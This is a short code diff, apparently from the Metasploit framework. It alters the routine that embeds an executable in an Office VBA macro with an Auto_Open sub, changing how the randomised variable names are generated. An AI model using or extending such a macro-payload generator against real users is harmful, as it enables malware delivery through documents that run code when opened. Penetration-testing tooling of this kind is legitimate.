@@ -685,8 +685,11 @@ module Text
 		pcs = (exe.length/2000)+1
 		idx = 0
 		
-		var_bytes = rand_text_alpha(rand(8)+8)
-		var_initx = rand_text_alpha(rand(8)+8).capitalize
+		var_base_idx = 0
+		var_base     = rand_text_alpha(2).capitalize
+		
+		var_bytes = var_base + (var_base_idx+=1).to_s
+		var_initx = var_base + rand_text_alpha(1) + (var_base_idx+=1).to_s
 		
 		vba << "Dim #{var_bytes}(#{exe.length}) as Byte\r\n\r\n"
 		1.upto(pcs) do |pc|
@@ -701,10 +704,10 @@ module Text
 			vba << "End Sub\r\n"
 		end
 		
-		var_lname = rand_text_alpha(rand(8)+8)
-		var_lpath = rand_text_alpha(rand(8)+8)
-		var_appnr = rand_text_alpha(rand(8)+8)
-		var_datnr = rand_text_alpha(rand(8)+8)
+		var_lname = var_base + (var_base_idx+=1).to_s
+		var_lpath = var_base + (var_base_idx+=1).to_s
+		var_appnr = var_base + (var_base_idx+=1).to_s
+		var_datnr = var_base + (var_base_idx+=1).to_s
 		
 		vba << "Sub Auto_Open()\r\n"
 		vba << "\tDim #{var_appnr} As Integer\r\n"
